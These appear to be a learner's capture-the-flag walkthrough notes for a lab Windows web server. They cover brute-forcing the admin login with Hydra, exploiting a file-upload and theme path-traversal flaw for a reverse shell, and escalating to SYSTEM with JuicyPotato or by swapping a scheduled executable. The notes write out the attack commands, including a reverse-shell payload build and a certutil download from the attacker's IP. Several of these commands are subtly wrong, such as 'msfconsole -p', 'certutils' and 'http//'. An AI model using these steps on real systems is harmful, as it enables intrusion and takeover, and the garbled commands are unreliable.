Initial nmap and autorecon scans show only port 80 is up
Upon visit, we see a page, and a link to login
Default login admin:admin doesnt work. So we bruteforce using Hydra for admin user

----
```zsh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.201.32.50 http-post-form "/Account/login.aspx?ReturnURL=admin:__VIEWSTATE=vg1PXyUaKEqrOpNYKwpm2VN7oTLUA%2BioAtuSC30miMTEWYjW1g%2BwTeO60v7%2Fw1RWGB8%2FmW%2FAXGtejIvS5BoTEo9yqs9LRdbKaqHFUDFSyo97v21ldqYCPH2L4vn%2FIV8701VqRwPYtAruw6%2FUu2JpFoon6gfmJg6ZnbecUQdAR9DYpB3J&__EVENTVALIDATION=0gF5OVzDBW47oNdf7gEE7uFcqgMAV8%2Bg7ss84qqShC7D%2B3%2FCSue4kcqsjv0jAOiuVbKPGCvWdQ1KHqeRxiyBq%2BqvtjvxRk2QV%2Fp3%2B7wRQh5FDILpbzOwUrJYMunC6uLjLtLsLAOaWpC0QU8d3vkh%2Fpj10r0KQQ5bEAdF0rqhTF7AQEqv&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv -t 32
```

Explanation -- 
brute forcing for admin. single user name, -l. -L for a file of usernames.
-P password list as file
IP
service (here, http-post-form) ((can be http-get as well as all other things that hydra supports))
then the path to login page - we changed the %2admin to admin at the end of the url.
then we picked the whole "VIEWSTATE" thing from burp, in which username ad password was being sent through POST. replaced actual username and password with ^USER^ ^PASS^. Put the VIEWSTATE thing in : :
-vv -t 32 ---> very verbose, threads 32

---
Once logged in, we find out the website uses BlogSite.NET v 3.3.6.0
Small research show it has an exploit as well. it is vulnerable to insecure file upload, file traversal and rce - due to improper sanitization of ?theme variable
Follow as the exploit says - modify the IP and port, start listening.
Edit post, click on "open file" image icon, upload the exploit as PostView.aspx
then http://ip/?theme=../../App_data/files - this is where our mal-file is stored at.
Rev-shell!

---
Now, we need a nesting place to pull winPEAS.
C:\Windows\Temp is Universe writable.

I found that `whoami /priv` showed the existence of seImpersonate token.
So juicyPotato did the trick.
Create msfvenom exploit.
`msfconsole -p windows/x64/shell_reverse_tcp LHOST=10.17.34.38 LPORT 443 -f exe -o rshell.exe`
pull jpm.exe and rshell.exe to windows mc.
`certutils -urlcache -f "http//10.17.34.38/jp_main.exe" jpm.exe`
get os info from systeminfo.
get the cnsid from https://ohpe.it/juicy-potato/CLSID/
F87B28F1-DA9A-4F35-8EC0-800EFCF26B83
`.\jpm.exe -l 1337 -c "{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}" -p rshell.exe -t *`

---
Other walkthroughs show they found the  WScheduler.exe using `tasklist` command, went to C:\Windows\Program Files (x86) and found the SystemScheduler. inside that dir, there be Message.exe, which get started and stopped every 30 seconds or so. Replace this with the rshll.exe, and we have an escalated shell - because the System Scheduler runs as System